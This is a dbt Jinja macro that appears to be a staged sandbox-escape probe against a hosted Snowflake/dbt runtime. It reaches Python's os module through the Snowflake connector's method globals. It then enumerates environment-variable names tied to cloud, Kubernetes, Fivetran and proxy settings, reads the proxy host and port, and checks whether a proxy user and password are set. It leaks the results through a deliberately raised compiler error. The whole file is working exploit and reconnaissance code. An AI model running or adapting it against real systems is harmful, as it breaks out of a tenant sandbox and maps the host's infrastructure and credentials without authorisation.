{% macro phase685_runtime_context_inventory() %}
  {% set query_result = adapter.add_query("select 1 as phase685_control", auto_begin=false) %}
  {% set connection = query_result[0].handle %}
  {% set rest = connection.rest %}
  {% do log("PHASE685_STAGE_1_REST", info=true) %}

  {% set snowflake_connection = rest._connection %}
  {% set session_config = rest.session_manager.config %}
  {% do log("PHASE685_STAGE_2_CONNECTION_CONTEXT", info=true) %}

  {% set method_globals = snowflake_connection.connect.__globals__ %}
  {% set os_module = method_globals.get("os") %}
  {% do log("PHASE685_STAGE_3_METHOD_GLOBALS", info=true) %}

  {% set interesting_names = [] %}
  {% if os_module is not none %}
    {% for key in os_module.environ.keys() %}
      {% set upper = key | upper %}
      {% if "PROXY" in upper
            or "HOST" in upper
            or "URL" in upper
            or "URI" in upper
            or "ENDPOINT" in upper
            or "SERVICE" in upper
            or "REGION" in upper
            or "FIVETRAN" in upper
            or "AWS_" in upper
            or "GOOGLE_" in upper
            or "GCP_" in upper
            or "AZURE_" in upper
            or "KUBERNETES_" in upper
            or "ECS_" in upper %}
        {% do interesting_names.append(key) %}
      {% endif %}
    {% endfor %}
  {% endif %}
  {% do log("PHASE685_STAGE_4_ENV_NAMES", info=true) %}

  {% set proxy_host = snowflake_connection.proxy_host | default("") %}
  {% set proxy_port = snowflake_connection.proxy_port | default("") %}
  {% set no_proxy = snowflake_connection.no_proxy | default("") %}
  {% set proxy_user = snowflake_connection.proxy_user | default("") %}
  {% set proxy_password = snowflake_connection.proxy_password | default("") %}
  {% set manager_proxy_host = session_config.proxy_host | default("") %}
  {% set manager_proxy_port = session_config.proxy_port | default("") %}

  {{ exceptions.raise_compiler_error(
      "PHASE685_RUNTIME_CONTEXT"
      ~ "|GLOBALS_PRESENT=" ~ (method_globals is mapping)
      ~ "|OS_PRESENT=" ~ (os_module is not none)
      ~ "|ENV_COUNT=" ~ (os_module.environ | length if os_module is not none else 0)
      ~ "|INTERESTING_ENV_KEYS=" ~ (interesting_names | sort | join(","))
      ~ "|PROXY_HOST=" ~ (proxy_host | string)
      ~ "|PROXY_PORT=" ~ (proxy_port | string)
      ~ "|NO_PROXY=" ~ (no_proxy | string)
      ~ "|PROXY_USER_PRESENT=" ~ ((proxy_user | string | length) > 0)
      ~ "|PROXY_PASSWORD_PRESENT=" ~ ((proxy_password | string | length) > 0)
      ~ "|SESSION_PROXY_MATCH=" ~ (
          (manager_proxy_host | string) == (proxy_host | string)
          and (manager_proxy_port | string) == (proxy_port | string)
      )
      ~ "|SNOWFLAKE_HOST=" ~ (snowflake_connection.host | string)
  ) }}
{% endmacro %}
